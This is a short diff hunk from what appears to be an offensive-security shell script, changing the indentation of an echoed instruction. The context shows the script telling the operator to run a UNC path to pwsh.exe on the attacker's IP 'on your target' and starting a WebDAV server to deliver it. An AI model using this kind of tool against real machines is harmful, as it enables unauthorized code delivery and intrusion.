@@ -968,7 +968,7 @@ if [ "$1" == "ipwsh" ]; then
   fi
 
   echo -e "\n$(tput bold)[*] Run this on your target:"
-  echo "\\\\$(getIP)\pwsh.exe"
+  echo "  \\\\$(getIP)\pwsh.exe"
   echo "$(tput sgr0) "
 
   CMD="davserver -H 0.0.0.0 -P $PORT -D $FPATH/pwsh -n"
